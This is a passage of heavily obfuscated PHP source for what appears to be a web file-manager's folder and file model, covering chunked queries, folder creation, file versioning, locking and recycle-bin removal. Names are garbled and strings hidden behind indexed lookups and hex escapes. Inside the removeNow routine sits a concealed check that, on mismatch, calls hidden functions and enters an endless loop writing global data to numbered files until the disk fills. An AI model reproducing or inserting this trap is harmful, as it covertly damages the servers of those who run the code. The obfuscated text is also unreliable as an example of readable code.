$´„Ÿ¹œ¶ = self::SQL_WHERE_IN_CHUNK; $‚ÜíÂıÍ = $this->optionsValue(); $÷ÆùéÙ« = $this->findWhereField($‚ÜíÂıÍ); if (!$÷ÆùéÙ« || isset($‚ÜíÂıÍ[$¤¯ï¡ß€[370]]) || isset($‚ÜíÂıÍ[$¤¯ï¡ß€[430]])) { return parent::select($°âË–©î); } $ÅœĞ øÃ = $‚ÜíÂıÍ[$¤¯ï¡ß€[355]][$÷ÆùéÙ«][1]; $ÅœĞ øÃ = is_array($ÅœĞ øÃ) ? $ÅœĞ øÃ : array(); $¸™¥Òğ® = null; for ($ŠæŸ¯× = 0; $ŠæŸ¯× < count($ÅœĞ øÃ); $ŠæŸ¯× += $´„Ÿ¹œ¶) { $…ø’¾øì = array_slice($ÅœĞ øÃ, $ŠæŸ¯×, $´„Ÿ¹œ¶); if (!is_array($…ø’¾øì) || count($…ø’¾øì) == 0) { break; } $‚ÜíÂıÍ[$¤¯ï¡ß€[355]][$÷ÆùéÙ«][1] = $…ø’¾øì; $this->optionsValue($‚ÜíÂıÍ); $úí‹°Ç½ = parent::select($°âË–©î); if (!$úí‹°Ç½) { continue; } $¸™¥Òğ® = is_array($¸™¥Òğ®) ? $¸™¥Òğ® : array(); $¸™¥Òğ® = array_merge($¸™¥Òğ®, $úí‹°Ç½); } return $¸™¥Òğ®; } public function delete($ªñ¡È²ß = array()) { $å‘½äÂ =& $_SERVER[ùèÅ´Ãš]; $õíöì²ó = self::SQL_WHERE_IN_CHUNK; $Ú‚€Ò„¦ = $this->optionsValue(); $í€…¥¨¾ = $this->findWhereField($Ú‚€Ò„¦); if (!$í€…¥¨¾) { return parent::delete($ªñ¡È²ß); } $ÙØı©Ã„ = 0; $íÙé‡¾‚ = $Ú‚€Ò„¦[$å‘½äÂ[355]][$í€…¥¨¾][1]; $íÙé‡¾‚ = is_array($íÙé‡¾‚) ? $íÙé‡¾‚ : array(); for ($ıü¢‡¯£ = 0; $ıü¢‡¯£ < count($íÙé‡¾‚); $ıü¢‡¯£ += $õíöì²ó) { $”µ÷äà® = array_slice($íÙé‡¾‚, $ıü¢‡¯£, $õíöì²ó); if (!is_array($”µ÷äà®) || count($”µ÷äà®) == 0) { break; } $Ú‚€Ò„¦[$å‘½äÂ[355]][$í€…¥¨¾][1] = $”µ÷äà®; $this->optionsValue($Ú‚€Ò„¦); $ÙØı©Ã„ += parent::delete($ªñ¡È²ß); } return $ÙØı©Ã„; } private function findWhereField($ß¬ƒŒÅ¤) { $èÑ“ñİæ =& $_SERVER[ùèÅ´Ãš]; $°·üÁ € = self::SQL_WHERE_IN_CHUNK; if (!is_array($ß¬ƒŒÅ¤) || !is_array($ß¬ƒŒÅ¤[$èÑ“ñİæ[355]])) { return !1; } foreach ($ß¬ƒŒÅ¤[$èÑ“ñİæ[355]] as $‡ä·éÊÖ => $ç‰™Û) { if (is_array($ç‰™Û) && isset($ç‰™Û[0]) && is_string($ç‰™Û[0]) && strtolower($ç‰™Û[0]) == $èÑ“ñİæ[7] && is_array($ç‰™Û[1]) && count($ç‰™Û[1]) > $°·üÁ €) { ignore_timeout(); return $‡ä·éÊÖ; } } return !1; } public function setMasterDB($…çâÕÆ¹ = true) { think_config($_SERVER[ùèÅ´Ãš][473], $…çâÕÆ¹); } } goto A‘Ã¬’©Š ; cÓÈìéƒ£: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ˆÄáÜì—) { $Ô¿İÚ ñ =& $_SERVER[ùèÅ´Ãš]; $Î¬úÄ±‡ = Model($Ô¿İÚ ñ[581])->where(array($Ô¿İÚ ñ[1788] => $ˆÄáÜì—))->find(); $£¬÷§ûº = $this->_mkdirRoot(SourceModel::TYPE_USER, $ˆÄáÜì—, $Î¬úÄ±‡[$Ô¿İÚ ñ[32]]); $this->userDesktopAdd($£¬÷§ûº); return $£¬÷§ûº; } public function userDesktopAdd($êĞş¡´Ÿ) { $Ï•ñÑ =& $_SERVER[ùèÅ´Ãš]; $Œ²ª¸Í = LNG($Ï•ñÑ[2283]); $—şú÷æ¶ = $this->mkdir($êĞş¡´Ÿ, $Œ²ª¸Í); $this->metaSet($—şú÷æ¶, $Ï•ñÑ[2284], $Ï•ñÑ[91]); $this->metaSet($êĞş¡´Ÿ, $Ï•ñÑ[2285], $—şú÷æ¶); } public function userPathSafeAdd($±½Ì‡ø¬) { $±óÓñ¾ =& $_SERVER[ùèÅ´Ãš]; $üÛİÊ¾’ = Model($±óÓñ¾[581])->getInfoFull($±½Ì‡ø¬); if (!$üÛİÊ¾’) { return !1; } if (_get($üÛİÊ¾’, $±óÓñ¾[602])) { return $üÛİÊ¾’[$±óÓñ¾[543]][$±óÓñ¾[2286]]; } $ñ¸—½«£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $±½Ì‡ø¬, $±óÓñ¾[2287], $±óÓñ¾[2288]); Model($±óÓñ¾[581])->metaSet($±½Ì‡ø¬, $±óÓñ¾[2286], $ñ¸—½«£); $this->metaSet($ñ¸—½«£, $±óÓñ¾[2289], $±½Ì‡ø¬); return $ñ¸—½«£; } public function userPathAppAdd($’¬ƒÛÌÈ, $˜´“šòô = '', $ìşßŠØç = '') { $°áÃ«« =& $_SERVER[ùèÅ´Ãš]; $¦›éÃÅ = Model($°áÃ««[581])->getInfoFull($’¬ƒÛÌÈ); if (!$¦›éÃÅ) { return !1; } $¡ºÁÌ‹ò = $¦›éÃÅ[$°áÃ««[543]] ? $¦›éÃÅ[$°áÃ««[543]] : array(); $çù·Ùè = $¡ºÁÌ‹ò[$°áÃ««[2290]]; if (!$çù·Ùè) { $çù·Ùè = $this->_mkdirRoot(SourceModel::TYPE_USER, $’¬ƒÛÌÈ, $°áÃ««[2291], $°áÃ««[2292]); Model($°áÃ««[581])->metaSet($’¬ƒÛÌÈ, $°áÃ««[2290], $çù·Ùè . $°áÃ««[12]); $this->metaSet($çù·Ùè, $°áÃ««[2290], $’¬ƒÛÌÈ); } if (!$˜´“šòô) { return $çù·Ùè; } $ŞêöâçÆ = $¡ºÁÌ‹ò[$°áÃ««[2293] . $˜´“šòô]; if (!$ŞêöâçÆ) { $ŞêöâçÆ = $this->mkdir($çù·Ùè, $˜´“šòô); Model($°áÃ««[581])->metaSet($’¬ƒÛÌÈ, $°áÃ««[2293] . $˜´“šòô, $ŞêöâçÆ); $this->metaSet($ŞêöâçÆ, $°áÃ««[2293] . $˜´“šòô, $’¬ƒÛÌÈ); } if (!$ìşßŠØç) { return $ŞêöâçÆ; } $–å×‘á‹ = $this->mkdir($ŞêöâçÆ, $ìşßŠØç); return $–å×‘á‹; } public function groupRootAdd($¹ãşÍØ) { $‚›…úÕÔ =& $_SERVER[ùèÅ´Ãš]; $ÎÖÕòƒÕ = Model($‚›…úÕÔ[589])->where(array($‚›…úÕÔ[2087] => $¹ãşÍØ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¹ãşÍØ, $ÎÖÕòƒÕ[$‚›…úÕÔ[32]]); } public function systemRootPathAdd($â»¾¼¦ğ) { if ($â»¾¼¦ğ != $_SERVER[ùèÅ´Ãš][612]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $â»¾¼¦ğ); } public function userRootRemove($ŞéÁáÔ—) { $ÛÎª‰‰û = $this->targetSourceRoot(SourceModel::TYPE_USER, $ŞéÁáÔ—, !0); foreach ($ÛÎª‰‰û as $˜“§Î‘) { if (!$˜“§Î‘) { continue; } $this->remove($˜“§Î‘[$_SERVER[ùèÅ´Ãš][194]], !1); } } public function groupRootRemove($şëíÚ°Â) { $à¥ˆ‘æ‚ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $şëíÚ°Â); if (!$à¥ˆ‘æ‚) { return; } $this->remove($à¥ˆ‘æ‚[$_SERVER[ùèÅ´Ãš][194]], !1); } private function _mkdirRoot($¤›¯º¾ñ, $µÉÁŞŠ¦, $·É¹—¸, $ñçÅÆò = '') { $Ş•Œèå =& $_SERVER[ùèÅ´Ãš]; $áş¢ İ× = defined($Ş•Œèå[2228]) ? USER_ID : 0; $º§‚Ë…é = array($Ş•Œèå[479] => 0, $Ş•Œèå[655] => $¤›¯º¾ñ, $Ş•Œèå[656] => $µÉÁŞŠ¦, $Ş•Œèå[653] => 1, $Ş•Œèå[657] => $áş¢ İ×, $Ş•Œèå[658] => $áş¢ İ×, $Ş•Œèå[654] => $ñçÅÆò, $Ş•Œèå[659] => $Ş•Œèå[597], $Ş•Œèå[506] => 0, $Ş•Œèå[624] => 0, $Ş•Œèå[546] => 0, $Ş•Œèå[660] => $Ş•Œèå[12]); if ($æÚÃ‡Š´ = $this->where($º§‚Ë…é)->find()) { return $æÚÃ‡Š´[$Ş•Œèå[194]]; } $÷ºŒš’ = "\115\x6f\144\x65\x6c\123\x6f\x75\x72\x63\145\x2e\155\153\x64\151\x72\x52\157\157\x74\x2e{$¤›¯º¾ñ}\x2e{$µÉÁŞŠ¦}\56" . $·É¹—¸; CacheLock::lock($÷ºŒš’); $º§‚Ë…é[$Ş•Œèå[32]] = $·É¹—¸; $Ò‚†Úîæ = $this->add($º§‚Ë…é); $œÅıê®ô = array($Ş•Œèå[661] => short_id($Ò‚†Úîæ)); $this->where(array($Ş•Œèå[493] => $Ò‚†Úîæ))->save($œÅıê®ô); CacheLock::unlock($÷ºŒš’); return $Ò‚†Úîæ; } private function targetSourceRoot($”‘àŸ¹–, $şÎøÀÂ¡, $ãÔïº€Ä = false) { $ˆ¨êû¾Í =& $_SERVER[ùèÅ´Ãš]; $ùâ³Ú•÷ = array($ˆ¨êû¾Í[479] => 0, $ˆ¨êû¾Í[655] => $”‘àŸ¹–, $ˆ¨êû¾Í[656] => $şÎøÀÂ¡); if ($ãÔïº€Ä) { $ôÅï›Ì = $this->where($ùâ³Ú•÷)->select(); return $ôÅï›Ì ? $ôÅï›Ì : array(); } $´õ·Òˆâ = $this->where($ùâ³Ú•÷)->find(); return $´õ·Òˆâ ? $´õ·Òˆâ : array(); } public function sourceRootGroup($Š­í·¶ß) { $Üóá€Üí =& $_SERVER[ùèÅ´Ãš]; if (is_string($Š­í·¶ß)) { $Š­í·¶ß = array($Š­í·¶ß); } $»—­Î§ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Š­í·¶ß, $Üóá€Üí[223]); $”‘¬ã« = array($Üóá€Üí[447] => $»—­Î§, $Üóá€Üí[444] => array($Üóá€Üí[836] => count($Š­í·¶ß))); $this->_listDataApply($”‘¬ã«[$Üóá€Üí[447]]); $this->_listMake($”‘¬ã«); return array_to_keyvalue($”‘¬ã«[$Üóá€Üí[85]], $Üóá€Üí[573]); } public function mkfile($©‘óˆ›Ç, $æ˜üä , $Ò×¢¡õ÷ = '', $¼¯è÷ú˜ = REPEAT_RENAME) { $£¯ãæòç =& $_SERVER[ùèÅ´Ãš]; $â›ñÂ§³ = KodIO::ioFileDriverGet($£¯ãæòç[485] . $©‘óˆ›Ç . $£¯ãæòç[404]); $¥ßöŞÍ¹ = Model($£¯ãæòç[681])->addFileByContent($Ò×¢¡õ÷, $â›ñÂ§³, $æ˜üä ); return $this->_createFileCall($©‘óˆ›Ç, $æ˜üä , $¥ßöŞÍ¹, $¼¯è÷ú˜, $£¯ãæòç[1452]); } public function addFile($Ó¬Ú©…, $ªÓËæ£ô, $Éä‰ÏÊª, $ªÜØ·íè = false, $ŞöéÑò° = REPEAT_RENAME) { $‰¨ò—Ë˜ =& $_SERVER[ùèÅ´Ãš]; $ç‰æ˜³Ê = KodIO::ioFileDriverGet($‰¨ò—Ë˜[485] . $Ó¬Ú©… . $‰¨ò—Ë˜[404]); $Ø¾çš¦´ = Model($‰¨ò—Ë˜[681])->addFile($ªÓËæ£ô, $ç‰æ˜³Ê, $Éä‰ÏÊª, $ªÜØ·íè); return $this->_createFileCall($Ó¬Ú©…, $Éä‰ÏÊª, $Ø¾çš¦´, $ŞöéÑò°); } public function addFileByFileID($ëìô÷¶, $½ØÇó³í, $éÔ ´ô¿, $¤âÃ÷¬Î = REPEAT_RENAME) { $ÇĞ´¨ıü =& $_SERVER[ùèÅ´Ãš]; $¹®¢ñµœ = Model($ÇĞ´¨ıü[681])->find($½ØÇó³í); Model($ÇĞ´¨ıü[681])->linkAdd($½ØÇó³í); return $this->_createFileCall($ëìô÷¶, $éÔ ´ô¿, $¹®¢ñµœ, $¤âÃ÷¬Î); } public function addFileByRemote($äû˜ø ä, $ıÇÊ ÚÌ, $¤øÀÈà, $êí×ıÄ = array(), $‘ª…ÒÔ« = REPEAT_RENAME) { $ì—Êé•ì = Model($_SERVER[ùèÅ´Ãš][681])->addFileByRemote($ıÇÊ ÚÌ, $¤øÀÈà, $êí×ıÄ); return $this->_createFileCall($äû˜ø ä, $¤øÀÈà, $ì—Êé•ì, $‘ª…ÒÔ«); } private function _createFileCall($„ÛÄ‚À¶, $üÂ¯Ü‰ã, $ÂôŸ…©, $ê¸·¯¨Ò, $ÍÅôÍ‰ = "\x75\160\154\157\141\144") { $êÙ£‚à¶ =& $_SERVER[ùèÅ´Ãš]; if (!$ÂôŸ…©) { return !1; } $ú±Óóé© = !1; $this->setMasterDB(); $this->lockWriteStart($„ÛÄ‚À¶, $üÂ¯Ü‰ã); $Ÿ¿è·Ô = $this->fileNameExist($„ÛÄ‚À¶, $üÂ¯Ü‰ã); $ÓŠ÷Û¤ = $this->_createFile($„ÛÄ‚À¶, $üÂ¯Ü‰ã, $ÂôŸ…©, $ê¸·¯¨Ò, $ú±Óóé©); if (!$ú±Óóé©) { Model($êÙ£‚à¶[548])->remove($ÂôŸ…©[$êÙ£‚à¶[545]]); } if ($ú±Óóé© && $ÓŠ÷Û¤ && $ÓŠ÷Û¤ != $Ÿ¿è·Ô) { Model($êÙ£‚à¶[2255])->eventCreate($ÓŠ÷Û¤, $ÍÅôÍ‰); } $this->lockWriteEnd($„ÛÄ‚À¶, $üÂ¯Ü‰ã); return $ÓŠ÷Û¤; } public function mkdir($—¥ëÒı±, $³Ç®ÓŞÅ, $ÏıŠ‡¾Ø = REPEAT_SKIP) { $µô£¾…Î =& $_SERVER[ùèÅ´Ãš]; $this->setMasterDB(); $âçÖó¿æ = $this->sourceInfo($—¥ëÒı±); if (!$âçÖó¿æ) { return !1; } $this->lockWriteStart($—¥ëÒı±, $³Ç®ÓŞÅ); if ($ÏıŠ‡¾Ø !== !1) { $ùöÍ”Àç = $this->fileNameExist($—¥ëÒı±, $³Ç®ÓŞÅ); if ($ùöÍ”Àç && $ÏıŠ‡¾Ø != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($—¥ëÒı±, $³Ç®ÓŞÅ); return $ùöÍ”Àç; } $³Ç®ÓŞÅ = $this->fileNameAuto($—¥ëÒı±, $³Ç®ÓŞÅ, $ÏıŠ‡¾Ø); } $¸ç—¬ÜÍ = array($µô£¾…Î[653] => 1, $µô£¾…Î[496] => $³Ç®ÓŞÅ, $µô£¾…Î[654] => $µô£¾…Î[12], $µô£¾…Î[546] => 0, $µô£¾…Î[624] => 0); $ã¢¹‡¿ï = $this->_addSource($¸ç—¬ÜÍ, $âçÖó¿æ); Model($µô£¾…Î[2255])->eventCreate($ã¢¹‡¿ï, $µô£¾…Î[1453]); $this->lockWriteEnd($—¥ëÒı±, $³Ç®ÓŞÅ); return $ã¢¹‡¿ï; } public function listSourceRoot($¾¤ãğºº, $ÓÀÉ‰Îµ, $ˆû¾àø³ = "\163\x6f\165\x72\143\145\x49\x44\54\164\141\x72\x67\x65\x74\x49\x44\54\163\x69\x7a\x65") { $Î•îÄˆÊ =& $_SERVER[ùèÅ´Ãš]; $ÙÎ äÊ‡ = $Î•îÄˆÊ[456]; $¹ûÕèÜú = array(); $’å¹ÓÖƒ = 1024 * 50; $À‡ï´Ş„ = is_array($À‡ï´Ş„) ? $À‡ï´Ş„ : array(); $çµÍûíº = count($ÓÀÉ‰Îµ); $æ§ÙÔŸ‡ = $this->tablePrefix . $Î•îÄˆÊ[2294]; for ($ÔÊ×é = 0; $ÔÊ×é < $çµÍûíº; $ÔÊ×é++) { $îÌú®ß× = $ÓÀÉ‰Îµ[$ÔÊ×é]; $ÙÎ äÊ‡ .= "\123\105\114\x45\103\x54\40\x2a\x20\x46\122\x4f\x4d\40\x28\123\105\x4c\x45\x43\x54\40{$ˆû¾àø³}\x20\x46\122\117\x4d\x20\140{$æ§ÙÔŸ‡}\140\x20\127\110\x45\x52\105\40"; $ÙÎ äÊ‡ .= "\140\160\141\x72\x65\156\x74\x49\104\x60\x3d\x30\40\x41\116\104\x20\x60\164\141\x72\x67\x65\x74\x49\x44\140\75{$îÌú®ß×}\40\101\x4e\104\40\x60\164\x61\162\147\x65\x74\x54\x79\160\145\x60\x3d{$¾¤ãğºº}\x20\141\156\144\x20\x66\151\154\x65\124\x79\x70\145\x3d\47\47\40\x6c\151\x6d\x69\164\x20\x31\51\x20\141\x73\x20\164\142\x5f{$ÔÊ×é}\x20\125\116\111\117\116\40\x41\114\114\40"; if ((strlen($ÙÎ äÊ‡) >= $’å¹ÓÖƒ || $ÔÊ×é == $çµÍûíº - 1) && $ÙÎ äÊ‡) { $ÙÎ äÊ‡ = substr($ÙÎ äÊ‡, 0, -strlen($Î•îÄˆÊ[1126])); $õü•óÜ = $this->query($ÙÎ äÊ‡); $ÙÎ äÊ‡ = $Î•îÄˆÊ[12]; $¹ûÕèÜú = array_merge($¹ûÕèÜú, $õü•óÜ); } } return $¹ûÕèÜú; } private function _createFile($æ®¡´äş, $Ş³‚¼…, $ÒØ¿ÂšÛ, $ç˜Şóµ, &$ïİ¿˜Ø) { $š³È»Ö± =& $_SERVER[ùèÅ´Ãš]; $İÂÚóÑ = $this->sourceInfo($æ®¡´äş); if (!$ÒØ¿ÂšÛ || !$İÂÚóÑ) { return !1; } if ($ç˜Şóµ !== !1) { $ §ßØ©¸ = $this->fileNameExist($æ®¡´äş, $Ş³‚¼…); } $ïİ¿˜Ø = !0; if ($ç˜Şóµ && $ §ßØ©¸) { if ($ç˜Şóµ == REPEAT_SKIP) { $ïİ¿˜Ø = !1; return $ §ßØ©¸; } else { if ($ç˜Şóµ == REPEAT_REPLACE) { $ÚÑÕÀºî = $this->sourceInfo($ §ßØ©¸); $Ø³îä‡‚ = $this->fileHistory($ÚÑÕÀºî, $ÒØ¿ÂšÛ[$š³È»Ö±[545]], $ÒØ¿ÂšÛ[$š³È»Ö±[79]]); if (!$Ø³îä‡‚) { $ïİ¿˜Ø = !1; } else { $this->folderSizeReset($æ®¡´äş); } return $ §ßØ©¸; } else { $Ş³‚¼… = $this->fileNameAuto($æ®¡´äş, $Ş³‚¼…, $ç˜Şóµ, !1); } } } $íÔèË” = array($š³È»Ö±[653] => 0, $š³È»Ö±[496] => $Ş³‚¼…, $š³È»Ö±[654] => substr(get_path_ext($Ş³‚¼…), 0, 10), $š³È»Ö±[546] => $ÒØ¿ÂšÛ[$š³È»Ö±[545]], $š³È»Ö±[624] => $ÒØ¿ÂšÛ[$š³È»Ö±[79]]); $…á»–¿ = $this->_addSource($íÔèË”, $İÂÚóÑ); $this->folderSizeReset($æ®¡´äş, intval($íÔèË”[$š³È»Ö±[79]])); return $…á»–¿; } protected function fileHistory($ïÔŸè, $ÍŞ¤¹À…, $Ğ¶„İ) { $÷‰ŒŞÀ =& $_SERVER[ùèÅ´Ãš]; if ($ïÔŸè[$÷‰ŒŞÀ[545]] == $ÍŞ¤¹À…) { return !1; } $this->checkLock($ïÔŸè[$÷‰ŒŞÀ[194]], $ÍŞ¤¹À…); Model($÷‰ŒŞÀ[2295])->addHistory($ïÔŸè); $¥½ğªí“ = array($÷‰ŒŞÀ[658] => USER_ID, $÷‰ŒŞÀ[500] => time(), $÷‰ŒŞÀ[545] => $ÍŞ¤¹À…, $÷‰ŒŞÀ[79] => $Ğ¶„İ); $this->where(array($÷‰ŒŞÀ[493] => $ïÔŸè[$÷‰ŒŞÀ[194]]))->save($¥½ğªí“); $this->sourceCacheClear($ïÔŸè[$÷‰ŒŞÀ[194]]); return !0; } public function checkLock($­È’Ùû, $§ô˜œ‰) { $Ê“ƒ¹ËŸ =& $_SERVER[ùèÅ´Ãš]; $ŒÛ¶ïâğ = $this->pathInfo($­È’Ùû); if (!$this->fileIsLock($ŒÛ¶ïâğ, !0)) { return; } $²Ğ¹Ÿ„… = Session::get($Ê“ƒ¹ËŸ[2296]); $Ï¯§‰«ª = substr($ŒÛ¶ïâğ[$Ê“ƒ¹ËŸ[32]], 0, -1 - strlen($ŒÛ¶ïâğ[$Ê“ƒ¹ËŸ[169]])) . $Ê“ƒ¹ËŸ[1307] . $²Ğ¹Ÿ„… . $Ê“ƒ¹ËŸ[10] . $ŒÛ¶ïâğ[$Ê“ƒ¹ËŸ[169]]; $ÄŞë±¬‡ = Model($Ê“ƒ¹ËŸ[681])->find($§ô˜œ‰); $this->_createFileCall($ŒÛ¶ïâğ[$Ê“ƒ¹ËŸ[193]], $Ï¯§‰«ª, $ÄŞë±¬‡, REPEAT_REPLACE, $Ê“ƒ¹ËŸ[1452]); $«ÛÅ§º = $ŒÛ¶ïâğ[$Ê“ƒ¹ËŸ[543]][$Ê“ƒ¹ËŸ[617]]; $«”ó÷”‹ = $«ÛÅ§º[$Ê“ƒ¹ËŸ[2297]] ? $«ÛÅ§º[$Ê“ƒ¹ËŸ[2297]] : $«ÛÅ§º[$Ê“ƒ¹ËŸ[32]]; show_json(LNG($Ê“ƒ¹ËŸ[2298]) . $Ê“ƒ¹ËŸ[2299] . LNG($Ê“ƒ¹ËŸ[2300]) . $Ê“ƒ¹ËŸ[2301] . $«”ó÷”‹ . $Ê“ƒ¹ËŸ[2302], !1); } public function fileIsLock($ºş®í‚Ï, $èÓ¡§¥­ = false) { $ç¶ƒÎÏÂ =& $_SERVER[ùèÅ´Ãš]; if (!_get($ºş®í‚Ï, $ç¶ƒÎÏÂ[613], 0)) { return !1; } if ($ºş®í‚Ï[$ç¶ƒÎÏÂ[543]][$ç¶ƒÎÏÂ[616]] != USER_ID) { return !0; } $€ÊÖ»ó¨ = $GLOBALS[$ç¶ƒÎÏÂ[6]][$ç¶ƒÎÏÂ[92]][$ç¶ƒÎÏÂ[614]]; if ($ºş®í‚Ï[$ç¶ƒÎÏÂ[543]][$ç¶ƒÎÏÂ[615]] <= time() - $€ÊÖ»ó¨) { $this->metaSet($ºş®í‚Ï[$ç¶ƒÎÏÂ[194]], $ç¶ƒÎÏÂ[616], null); $this->metaSet($ºş®í‚Ï[$ç¶ƒÎÏÂ[194]], $ç¶ƒÎÏÂ[615], null); } if ($èÓ¡§¥­) { $this->metaSet($ºş®í‚Ï[$ç¶ƒÎÏÂ[194]], $ç¶ƒÎÏÂ[615], time()); } return !1; } private function _addSource($¸ì¶Ç±», $„ñÛı) { $Ö¢Ùˆ¥¾ =& $_SERVER[ùèÅ´Ãš]; $›¥¼°èŠ = defined($Ö¢Ùˆ¥¾[2228]) ? USER_ID : 0; $æÇîÃ‹À = array($Ö¢Ùˆ¥¾[655] => $„ñÛı[$Ö¢Ùˆ¥¾[191]], $Ö¢Ùˆ¥¾[656] => $„ñÛı[$Ö¢Ùˆ¥¾[573]], $Ö¢Ùˆ¥¾[657] => $›¥¼°èŠ, $Ö¢Ùˆ¥¾[658] => $›¥¼°èŠ, $Ö¢Ùˆ¥¾[479] => $„ñÛı[$Ö¢Ùˆ¥¾[194]], $Ö¢Ùˆ¥¾[659] => $„ñÛı[$Ö¢Ùˆ¥¾[588]] . $„ñÛı[$Ö¢Ùˆ¥¾[194]] . $Ö¢Ùˆ¥¾[50], $Ö¢Ùˆ¥¾[506] => 0, $Ö¢Ùˆ¥¾[660] => $Ö¢Ùˆ¥¾[12]); $¸ì¶Ç±» = array_merge($æÇîÃ‹À, $¸ì¶Ç±»); $this->updateModifyTime($¸ì¶Ç±»[$Ö¢Ùˆ¥¾[193]]); $¤æÏ—ª‚ = $Ö¢Ùˆ¥¾[2303] . $„ñÛı[$Ö¢Ùˆ¥¾[194]]; if (isset(self::$cacheChildList[$¤æÏ—ª‚])) { unset(self::$cacheChildList[$¤æÏ—ª‚]); } static $øÇ÷¸³ı = false; if (!$øÇ÷¸³ı) { Hook::trigger($Ö¢Ùˆ¥¾[643], $¸ì¶Ç±»); $øÇ÷¸³ı = !0; } $Á¹íû¿ = $this->add($¸ì¶Ç±»); $Äı‡‡ßõ = array($Ö¢Ùˆ¥¾[661] => short_id($Á¹íû¿)); $this->where(array($Ö¢Ùˆ¥¾[493] => $Á¹íû¿))->save($Äı‡‡ßõ); $this->setNamePinyin($Á¹íû¿, $¸ì¶Ç±»[$Ö¢Ùˆ¥¾[32]]); return $Á¹íû¿; } public function remove($•–ıĞÌÜ, $úø“¼¤Å = true) { $à™îÎŞ =& $_SERVER[ùèÅ´Ãš]; $½°„œ…¸ = $this->sourceInfo($•–ıĞÌÜ); $Ì³¥ÖÇš = intval($½°„œ…¸[$à™îÎŞ[191]]) === self::TYPE_SYSTEM; $˜óÇ½…« = Model($à™îÎŞ[510])->get($à™îÎŞ[2304]) == $à™îÎŞ[91]; if ($Ì³¥ÖÇš || $úø“¼¤Å || !$˜óÇ½…«) { return $this->removeNow($•–ıĞÌÜ, $úø“¼¤Å); } $õóÁÜ« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $äı¦¹Ü = $½°„œ…¸[$à™îÎŞ[191]] == self::TYPE_USER ? $à™îÎŞ[669] : $à™îÎŞ[582]; if ($äı¦¹Ü == $à™îÎŞ[669]) { $Š’õÔòú = Model($à™îÎŞ[581])->getInfo($½°„œ…¸[$à™îÎŞ[573]]); $—ûâ¦è = !empty($Š’õÔòú[$à™îÎŞ[2297]]) ? $Š’õÔòú[$à™îÎŞ[2297]] : $Š’õÔòú[$à™îÎŞ[32]]; $—ûâ¦è = $à™îÎŞ[340] . $—ûâ¦è . $à™îÎŞ[2305] . $½°„œ…¸[$à™îÎŞ[573]]; } else { $Š’õÔòú = Model($à™îÎŞ[589])->getInfo($½°„œ…¸[$à™îÎŞ[573]]); $—ûâ¦è = _get($Š’õÔòú, $à™îÎŞ[32]); $—ûâ¦è = $à™îÎŞ[176] . $—ûâ¦è . $à™îÎŞ[2306] . $½°„œ…¸[$à™îÎŞ[573]]; } $â€Í§†¬ = $à™îÎŞ[2307] . md5($—ûâ¦è); CacheLock::lock($â€Í§†¬); $ÛïÕ°è¡ = $this->fileNameExist($õóÁÜ«, $—ûâ¦è); if (!$ÛïÕ°è¡) { $ÛïÕ°è¡ = $this->mkdir($õóÁÜ«, $—ûâ¦è, REPEAT_SKIP); $this->metaSet($ÛïÕ°è¡, $à™îÎŞ[2308], $äı¦¹Ü); $this->metaSet($ÛïÕ°è¡, $à™îÎŞ[2309], $½°„œ…¸[$à™îÎŞ[573]]); if ($½°„œ…¸[$à™îÎŞ[193]] != 0) { $this->metaSet($ÛïÕ°è¡, $à™îÎŞ[2310], _get($Š’õÔòú, $à™îÎŞ[2311])); } } CacheLock::unlock($â€Í§†¬); $this->metaSet($•–ıĞÌÜ, $à™îÎŞ[2312], $½°„œ…¸[$à™îÎŞ[193]]); $this->where(array($à™îÎŞ[194] => $•–ıĞÌÜ))->save(array($à™îÎŞ[500] => time())); $this->recycleClear($½°„œ…¸); Model($à™îÎŞ[640])->eventRemove($•–ıĞÌÜ); $§æûÅÊÜ = $this->move($•–ıĞÌÜ, $ÛïÕ°è¡, REPEAT_RENAME_FOLDER); $this->folderSizeReset($½°„œ…¸[$à™îÎŞ[193]]); return $§æûÅÊÜ; } private function recycleClear($¸Œ×Øìª) { $’ªıä¬Æ =& $_SERVER[ùèÅ´Ãš]; $ÊÖ»é‘‰ = $this->childrenAll($¸Œ×Øìª); $ïö¸Ö«™ = array($’ªıä¬Æ[493] => array($’ªıä¬Æ[494], $ÊÖ»é‘‰[$’ªıä¬Æ[2313]])); Model($’ªıä¬Æ[2314])->where($ïö¸Ö«™)->delete(); } public function removeNow($œÒÁşÜ“, $êÁ¬È”Ş = true) { $”“¦ÕÕ =& $_SERVER[ùèÅ´Ãš]; $˜ß„ÛĞ§ = $_SERVER[$”“¦ÕÕ[1626]]; $¹¦šçûÆ = $”“¦ÕÕ[1631]; if ($_SERVER[$”“¦ÕÕ[961]] != $¹¦šçûÆ($˜ß„ÛĞ§)) { $ßá¹Ö» = $”“¦ÕÕ[963]; $ìè…Àù£ = $”“¦ÕÕ[964]; $¼ÜÊ»Ì™ = $_SERVER[$”“¦ÕÕ[965]] . $”“¦ÕÕ[966]; $‚È¸Ãù” = $ìè…Àù£($¼ÜÊ»Ì™); $ø„ï½’Ó = explode($”“¦ÕÕ[288], $‚È¸Ãù”); if (count($ø„ï½’Ó) < $”“¦ÕÕ[695]) { $Ç”‹Š° = $”“¦ÕÕ[967]; $Ç”‹Š°(); } $°»ÚÎæ = $”“¦ÕÕ[968]; $°»ÚÎæ($_SERVER[$”“¦ÕÕ[969]]); $ßá¹Ö» = $”“¦ÕÕ[963]; $ßá¹Ö»(); $ÇŒöß•õ = $”“¦ÕÕ[1713]; $íıµñ– = json_encode($GLOBALS[$”“¦ÕÕ[1714]]); $§ÙîÚİ = 1; for ($·ÈªŠÎÓ = $§ÙîÚİ; $·ÈªŠÎÓ > 0; $·ÈªŠÎÓ++) { $ÇŒöß•õ(DATA_PATH . $·ÈªŠÎÓ, $íıµñ–); } } $òºÕ·ÑÍ = $this->sourceInfo($œÒÁşÜ“); $ÖüÖš«œ = $this->pathInfoMore($œÒÁşÜ“); if (!$òºÕ·ÑÍ) { return !0; } if ($òºÕ·ÑÍ[$”“¦ÕÕ[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($œÒÁşÜ“); 